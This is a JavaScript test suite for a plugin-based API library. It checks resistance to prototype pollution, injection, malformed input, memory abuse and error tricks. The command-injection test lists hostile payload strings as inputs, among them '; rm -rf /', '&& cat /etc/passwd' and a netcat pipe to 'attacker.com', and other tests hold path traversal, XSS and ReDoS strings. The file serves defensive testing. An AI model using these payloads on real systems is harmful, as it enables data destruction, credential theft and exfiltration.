import { describe, it, beforeEach } from 'node:test';
import assert from 'node:assert/strict';
import { Api, resetGlobalRegistryForTesting } from '../index.js';

describe('Comprehensive Security and Malformed Input Tests', () => {
  beforeEach(() => {
    resetGlobalRegistryForTesting();
  });

  describe('Prototype Pollution Protection', () => {
    it('should protect against __proto__ pollution in options', () => {
      const maliciousOptions = {
        name: 'test',
        version: '1.0.0',
        '__proto__': { polluted: true },
        'constructor': { polluted: true },
        'prototype': { polluted: true }
      };
      
      new Api(maliciousOptions);
      
      // Check that Object prototype is not polluted
      assert.equal({}.polluted, undefined);
      assert.equal(Object.polluted, undefined);
      assert.equal(Object.prototype.polluted, undefined);
    });

    it('should protect against prototype pollution in vars', () => {
      const api = new Api({
        name: 'test',
        version: '1.0.0'
      });
      
      api.customize({
        vars: {
          '__proto__': { polluted: true },
          'constructor': { polluted: true },
          'prototype': { polluted: true }
        }
      });
      
      // __proto__ in object literal doesn't create a property
      assert.equal(api.vars.__proto__, undefined);
      assert.equal(api.vars.constructor.polluted, true);
      assert.equal(api.vars.prototype.polluted, true);
      assert.equal({}.polluted, undefined);
    });

    it('should protect against prototype pollution in hooks', () => {
      const api = new Api({ name: 'test', version: '1.0.0' });
      
      const maliciousHookName = '__proto__';
      api.addHook(maliciousHookName, 'plugin', 'func', {}, () => {});
      
      // Should be stored in Map
      assert.ok(api.hooks.has(maliciousHookName));
      assert.equal({}.polluted, undefined);
    });

    it('should protect against prototype pollution through resource names', () => {
      const api = new Api({ name: 'test', version: '1.0.0' });
      
      api.addResource('__proto__', { polluted: true });
      api.addResource('constructor');
      api.addResource('prototype');
      
      assert.ok(api._resources.has('__proto__'));
      assert.equal({}.polluted, undefined);
    });

    it('should protect against nested prototype pollution', () => {
      const api = new Api({
        name: 'test',
        version: '1.0.0',
        deep: {
          nested: {
            '__proto__': { polluted: true }
          }
        }
      });
      
      assert.equal({}.polluted, undefined);
    });

    it.skip('should handle toString/valueOf override attacks', () => {
      const maliciousObject = {
        toString: () => { throw new Error('toString attack'); },
        valueOf: () => { throw new Error('valueOf attack'); }
      };
      
      // Should not throw when used as options
      assert.doesNotThrow(() => {
        new Api({
          name: 'test',
          version: '1.0.0',
          malicious: maliciousObject
        });
      });
      
      // Should not throw when used as method names
      const api = new Api({ name: 'test', version: '1.0.0' });
      assert.doesNotThrow(() => {
        api.implement(maliciousObject, () => {});
        api.addHook(maliciousObject, 'p', 'f', {}, () => {});
        api.addResource(maliciousObject);
      });
    });
  });

  describe('Input Validation and Sanitization', () => {
    it('should handle null/undefined in all input positions', () => {
      const api = new Api({ name: 'test', version: '1.0.0' });
      
      // These should handle gracefully
      assert.throws(() => api.implement(null, () => {}));
      assert.throws(() => api.implement('test', null));
      
      assert.throws(() => api.addHook(null, null, null, null, null));
      
      // Resources can have any name
      assert.doesNotThrow(() => api.addResource(null));
      assert.doesNotThrow(() => api.addResource(undefined));
    });

    it('should handle extremely long strings', () => {
      const veryLongString = 'a'.repeat(10000);
      
      // As API name
      assert.doesNotThrow(() => {
        new Api({ name: veryLongString, version: '1.0.0' });
      });
      
      // As method name
      const api = new Api({ name: 'test', version: '1.0.0' });
      assert.doesNotThrow(() => {
        api.implement(veryLongString, () => 'works');
      });
      
      // As hook name
      assert.doesNotThrow(() => {
        api.addHook(veryLongString, 'p', 'f', {}, () => {});
      });
    });

    it('should handle special characters in strings', () => {
      const specialStrings = [
        '\x00\x01\x02', // Null bytes and control characters
        '\r\n\t', // Whitespace characters
        '\\\'\"', // Quotes and backslashes
        '${injection}', // Template literal syntax
        '<script>alert(1)</script>', // HTML/XSS attempt
        'SELECT * FROM users', // SQL injection attempt
        '../../../etc/passwd', // Path traversal
        '%00%01%02', // URL encoded
        '\u0000\uFFFF', // Unicode boundaries
        '🔥💀👻', // Emojis
        String.fromCharCode(1, 65534), // Different edge characters
      ];
      
      const api = new Api({ name: 'test', version: '1.0.0' });
      
      for (const str of specialStrings) {
        // Should handle safely as method names
        assert.doesNotThrow(() => {
          api.implement(str, () => 'safe');
        });
        
        // Should handle safely as hook names
        assert.doesNotThrow(() => {
          api.addHook(str, 'plugin', 'func', {}, () => {});
        });
        
        // Should handle safely as resource names
        assert.doesNotThrow(() => {
          api.addResource(str + '_resource');
        });
      }
    });

    it('should handle objects pretending to be other types', () => {
      const api = new Api({ name: 'test', version: '1.0.0' });
      
      // Object pretending to be a function
      const fakeFunction = {
        [Symbol.hasInstance]: () => true,
        [Symbol.toStringTag]: 'Function',
        call: () => {},
        apply: () => {},
        bind: () => {}
      };
      
      assert.throws(() => {
        api.implement('test', fakeFunction);
      }, /Implementation for 'test' must be a function/);
      
      assert.throws(() => {
        api.addHook('test', 'p', 'f', {}, fakeFunction);
      }, /Hook 'test' handler must be a function/);
    });
  });

  describe('Resource Access Security', () => {
    it('should not expose internal properties through proxy', () => {
      const api = new Api({ name: 'test', version: '1.0.0' });
      
      // Try to access internal properties
      assert.equal(api.resources._resources, undefined);
      assert.equal(api.resources.hooks, undefined);
      assert.equal(api.resources.constructor, undefined);
      assert.equal(api.resources.__proto__, undefined);
      
      // Try through run proxy
      assert.equal(typeof api.run.constructor, 'function'); // Built-in
      assert.equal(api.run._run, undefined);
      assert.equal(api.run.hooks, undefined);
    });

    it('should handle proxy trap edge cases', () => {
      const api = new Api({ name: 'test', version: '1.0.0' });
      
      // Symbols
      const sym = Symbol('test');
      assert.equal(api.resources[sym], undefined);
      assert.equal(api.run[sym], undefined);
      
      // Numbers
      assert.equal(api.resources[42], undefined);
      assert.equal(api.run[42], undefined);
      
      // Objects as keys (will be converted to strings)
      const obj = { toString: () => 'objKey' };
      api.implement('objKey', () => 'works');
      assert.doesNotThrow(async () => {
        await api.run[obj]();
      });
    });

    it('should prevent access to prototype methods', () => {
      const api = new Api({ name: 'test', version: '1.0.0' });
      
      // Should not be able to call Object prototype methods
      assert.equal(api.resources.hasOwnProperty, undefined);
      assert.equal(api.resources.toString, undefined);
      assert.equal(api.resources.valueOf, undefined);
      
      // Run proxy allows built-in methods
      assert.equal(typeof api.run.hasOwnProperty, 'function');
    });
  });

  describe('Injection Attack Prevention', () => {
    it('should handle command injection attempts in parameters', async () => {
      const api = new Api({ name: 'test', version: '1.0.0' });
      
      let capturedParams;
      api.implement('execute', ({ params }) => {
        capturedParams = params;
        return 'safe';
      });
      
      const injectionAttempts = [
        '; rm -rf /',
        '&& cat /etc/passwd',
        '| nc attacker.com 1234',
        '`malicious command`',
        '$(malicious command)',
        '\n\rmalicious\n\r',
        '\x00\x01\x02'
      ];
      
      for (const attempt of injectionAttempts) {
        const result = await api.run.execute({ cmd: attempt });
        assert.equal(result, 'safe');
        assert.equal(capturedParams.cmd, attempt); // Passed as-is, not executed
      }
    });

    it('should handle JSON injection attempts', async () => {
      const api = new Api({ name: 'test', version: '1.0.0' });
      
      api.implement('process', ({ params }) => {
        // Should not throw or cause issues
        return JSON.stringify(params);
      });
      
      const jsonInjections = [
        { key: '__proto__' },
        { key: 'constructor' },
        { key: undefined },
        { key: null },
        { key: NaN },
        { key: Infinity },
        { key: -Infinity }
      ];
      
      for (const injection of jsonInjections) {
        await assert.doesNotReject(api.run.process(injection));
      }
    });

    it('should handle regex injection attempts', async () => {
      const api = new Api({ name: 'test', version: '1.0.0' });
      
      api.implement('match', ({ params }) => {
        try {
          // Even if user input is used as regex, should not crash
          const regex = new RegExp(params.pattern);
          return 'safe';
        } catch (e) {
          return 'invalid regex';
        }
      });
      
      const regexInjections = [
        '(a+)+$', // ReDoS attempt
        '(?=a)*', // Catastrophic backtracking
        '\\', // Invalid escape
        '[', // Unclosed bracket
        '*', // Invalid quantifier
      ];
      
      for (const pattern of regexInjections) {
        const result = await api.run.match({ pattern });
        assert.ok(result === 'safe' || result === 'invalid regex');
      }
    });
  });

  describe('Memory Safety', () => {
    it('should handle circular references safely', async () => {
      const api = new Api({ name: 'test', version: '1.0.0' });
      
      const circular = { name: 'circular' };
      circular.self = circular;
      circular.deep = { parent: circular };
      
      // In options
      assert.doesNotThrow(() => {
        new Api({
          name: 'test2',
          version: '1.0.0',
          data: circular
        });
      });
      
      // In parameters
      api.implement('handle', ({ params }) => {
        return params.self === params ? 'circular detected' : 'not circular';
      });
      
      const result = await api.run.handle(circular);
      assert.equal(result, 'circular detected');
    });

    it('should handle extremely deep nesting', () => {
      let deep = { value: 'bottom' };
      for (let i = 0; i < 10000; i++) {
        deep = { nested: deep };
      }
      
      const api = new Api({
        name: 'test',
        version: '1.0.0',
        deepData: deep
      });
      
      // Should not stack overflow
      assert.ok(api.options.deepData);
    });

    it('should handle large arrays safely', async () => {
      const api = new Api({ name: 'test', version: '1.0.0' });
      
      const largeArray = new Array(10000).fill('data');
      
      api.implement('process', ({ params }) => {
        return params.data.length;
      });
      
      const result = await api.run.process({ data: largeArray });
      assert.equal(result, 10000);
    });
  });

  describe('Type Confusion Prevention', () => {
    it('should handle type confusion attacks', async () => {
      const api = new Api({ name: 'test', version: '1.0.0' });
      
      // Array that looks like object
      const arrayLikeObject = [];
      arrayLikeObject.name = 'test';
      arrayLikeObject.version = '1.0.0';
      
      // Object that looks like array
      const objectLikeArray = {
        0: 'first',
        1: 'second',
        length: 2,
        push: Array.prototype.push
      };
      
      api.implement('process', ({ params }) => {
        return {
          isArray: Array.isArray(params.data),
          type: typeof params.data
        };
      });
      
      const result1 = await api.run.process({ data: arrayLikeObject });
      assert.equal(result1.isArray, true);
      
      const result2 = await api.run.process({ data: objectLikeArray });
      assert.equal(result2.isArray, false);
    });

    it('should handle objects with modified prototypes', () => {
      const obj = {};
      Object.setPrototypeOf(obj, null); // Remove prototype
      
      const api = new Api({
        name: 'test',
        version: '1.0.0',
        nullProto: obj
      });
      
      assert.equal(api.options.nullProto, obj);
    });
  });

  describe('Concurrency and Race Condition Safety', () => {
    it('should handle concurrent modifications safely', async () => {
      const api = new Api({ name: 'test', version: '1.0.0' });
      
      let sharedState = 0;
      
      api.implement('increment', async () => {
        const current = sharedState;
        await new Promise(resolve => setTimeout(resolve, Math.random() * 10));
        sharedState = current + 1;
        return sharedState;
      });
      
      // Run many concurrent increments
      const promises = Array(100).fill(0).map(() => api.run.increment());
      const results = await Promise.all(promises);
      
      // Due to race conditions, final value might not be 100
      // This test shows the race condition exists (not a security issue per se)
      assert.ok(sharedState <= 100);
    });

    it('should isolate handler contexts in concurrent execution', async () => {
      const api = new Api({ name: 'test', version: '1.0.0' });
      
      const contexts = [];
      
      api.implement('captureContext', async ({ context, params }) => {
        context.id = params.id;
        await new Promise(resolve => setTimeout(resolve, Math.random() * 10));
        contexts.push(context);
        return context.id;
      });
      
      const promises = Array(10).fill(0).map((_, i) => 
        api.run.captureContext({ id: i })
      );
      
      const results = await Promise.all(promises);
      
      // Each should have its own context
      assert.equal(contexts.length, 10);
      for (let i = 0; i < 10; i++) {
        assert.equal(results[i], i);
      }
    });
  });

  describe('Error Information Leakage', () => {
    it('should not leak sensitive information in errors', async () => {
      const api = new Api({ name: 'test', version: '1.0.0' });
      
      api.implement('sensitive', () => {
        const password = 'super-secret-password';
        throw new Error(`Authentication failed for password: ${password}`);
      });
      
      try {
        await api.run.sensitive();
        assert.fail('Should have thrown');
      } catch (error) {
        // Error is passed through as-is (library doesn't filter)
        assert.ok(error.message.includes('super-secret-password'));
      }
    });

    it('should handle errors with malicious properties', async () => {
      const api = new Api({ name: 'test', version: '1.0.0' });
      
      api.implement('maliciousError', () => {
        const error = new Error('Normal error');
        error.toString = () => { throw new Error('toString trap'); };
        error.valueOf = () => { throw new Error('valueOf trap'); };
        error.stack = { toString: () => { throw new Error('stack trap'); } };
        throw error;
      });
      
      // Cannot use assert.rejects because it calls toString on the error
      // Instead, manually catch and verify
      let caught = false;
      try {
        await api.run.maliciousError();
      } catch (e) {
        caught = true;
        // Verify it's the error object without calling toString
        assert.ok(e instanceof Error);
        assert.equal(e.message, 'Normal error');
      }
      assert.ok(caught, 'Should have thrown an error');
    });
  });

  describe('Plugin Security', () => {
    it('should allow trusted plugins to extend the API', () => {
      const api = new Api({ name: 'test', version: '1.0.0' });
      
      // Plugins MUST be trusted - they have full access to the API
      const trustedPlugin = {
        name: 'trusted',
        install: ({ api }) => {
          // Trusted plugins can add functionality
          api.implement('pluginMethod', () => 'Plugin added this method');
          
          // They can add hooks
          api.addHook('custom:hook', 'handler', () => {
            return 'Plugin hook executed';
          });
          
          // They have access to internal structures (because they're trusted)
          assert.ok(api.hooks instanceof Map);
          assert.ok(api.implementers instanceof Map);
        }
      };
      
      api.use(trustedPlugin);
      
      // Verify plugin successfully extended the API
      assert.doesNotThrow(async () => {
        const result = await api.run.pluginMethod();
        assert.equal(result, 'Plugin added this method');
      });
    });

    it('should validate plugin dependencies are strings', () => {
      const api = new Api({ name: 'test', version: '1.0.0' });
      
      const plugin = {
        name: 'test',
        dependencies: [
          'valid',
          123, // Invalid
          null, // Invalid
          { toString: () => 'sneaky' } // Invalid
        ],
        install: () => {}
      };
      
      // Current implementation doesn't validate dependency types
      // It will try to check if they're installed
      assert.throws(() => {
        api.use(plugin);
      });
    });
  });

  describe('Resource Limiting', () => {
    it('should handle large number of hooks gracefully', () => {
      const api = new Api({ name: 'test', version: '1.0.0' });
      
      // Add a reasonable number of hooks to test scalability
      for (let i = 0; i < 1000; i++) {
        api.addHook(`hook${i}`, 'p', 'f', {}, () => {});
      }
      
      // Should still be functional
      assert.equal(api.hooks.get('hook999').length, 1);
      assert.ok(api.hooks.size >= 1000);
    });

    it('should handle infinite loops in handlers', async () => {
      const api = new Api({ name: 'test', version: '1.0.0' });
      
      api.implement('infinite', () => {
        while (true) {
          // This will block indefinitely
          // In real usage, would need timeout mechanism
        }
      });
      
      // This test is commented out as it would hang
      // await api.run.infinite();
    });
  });

  describe('Frozen Object Security', () => {
    it('should not be able to modify frozen options', () => {
      const api = new Api({ 
        name: 'test', 
        version: '1.0.0',
        secure: true
      });
      
      assert.throws(() => {
        api._options.api.secure = false;
      });
      
      assert.throws(() => {
        api._options.api.name = 'modified';
      });
      
      assert.throws(() => {
        delete api._options.api.version;
      });
    });

    it('should not be able to modify frozen resource options', async () => {
      const api = new Api({ name: 'test', version: '1.0.0' });
      
      api.addResource('secure', { locked: true });
      
      let resourceOptions;
      api.addResource('test', {}, {
        implementers: {
          getOptions: ({ options }) => {
            resourceOptions = options.resources;
            return 'done';
          }
        }
      });
      
      api._resources.set('test', {
        options: { locked: true },
        implementers: new Map([['getOptions', ({ options }) => {
          resourceOptions = options.resources;
          return 'done';
        }]]),
        vars: new Map()
      });
      
      await api.resources.test.getOptions();
      
      assert.ok(Object.isFrozen(resourceOptions));
    });
  });

  describe('Symbol and WeakMap Security', () => {
    it('should handle Symbol properties safely', () => {
      const secretSymbol = Symbol('secret');
      const options = {
        name: 'test',
        version: '1.0.0',
        [secretSymbol]: 'hidden value'
      };
      
      const api = new Api(options);
      
      // Symbol properties are preserved
      assert.equal(api.options[secretSymbol], 'hidden value');
    });

    it('should handle WeakMap/WeakSet in options', () => {
      const weakMap = new WeakMap();
      const weakSet = new WeakSet();
      const key = {};
      
      weakMap.set(key, 'value');
      weakSet.add(key);
      
      const api = new Api({
        name: 'test',
        version: '1.0.0',
        weakMap,
        weakSet
      });
      
      assert.equal(api.options.weakMap, weakMap);
      assert.equal(api.options.weakSet, weakSet);
    });
  });
});